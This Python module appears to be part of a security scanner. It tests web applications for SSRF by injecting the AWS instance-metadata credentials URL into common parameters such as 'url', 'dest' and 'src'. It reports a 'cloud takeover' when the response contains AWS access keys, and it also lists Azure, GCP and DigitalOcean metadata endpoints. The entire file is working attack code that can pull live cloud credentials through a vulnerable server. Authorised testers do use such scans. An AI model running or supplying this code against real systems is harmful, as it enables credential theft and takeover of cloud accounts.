import asyncio
from modules.core import console

# Cloud Metadata URLs
METADATA_URLS = {
    "AWS": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "GCP": "http://metadata.google.internal/computeMetadata/v1/",
    "Azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "DigitalOcean": "http://169.254.169.254/metadata/v1/"
}

async def check_metadata(session, url, param):
    try:
        # We try to force the backend to fetch the metadata URL
        target_aws = f"{url}?{param}={METADATA_URLS['AWS']}"
        if "?" in url: target_aws = f"{url}&{param}={METADATA_URLS['AWS']}"
        
        async with session.get(target_aws, timeout=4, ssl=False) as resp:
            text = await resp.text()
            
            # AWS Success Indicator (role name typically returned)
            if resp.status == 200 and "Code" in text and "AccessKeyId" in text and "SecretAccessKey" in text:
                 return {
                    "url": target_aws,
                    "param": param,
                    "type": "Metadata SSRF (AWS Takeover)",
                    "evidence": "AWS Keys Exposed"
                }

    except Exception:
        pass
    return None

async def scan_metadata_ssrf(session, url):
    """
    Scan for Cloud Metadata SSRF (Instance Takeover).
    """
    console.print(f"\n[bold cyan]--- Metadata SSRF (Cloud Takeover) ---[/bold cyan]")
    
    # URL/Resource Params
    params = ["url", "dest", "target", "link", "src", "image", "ref"]
    
    tasks = [check_metadata(session, url, p) for p in params]
    
    results = await asyncio.gather(*tasks)
    
    found = []
    for res in results:
        if res:
             console.print(f"  [bold red][!] CLOUD TAKEOVER CONFIRMED: {res['param']}[/bold red]")
             console.print(f"      Type: {res['type']}")
             found.append(res)
             
    if not found:
        console.print("[dim][-] No Metadata SSRF detected.[/dim]")
        
    return found
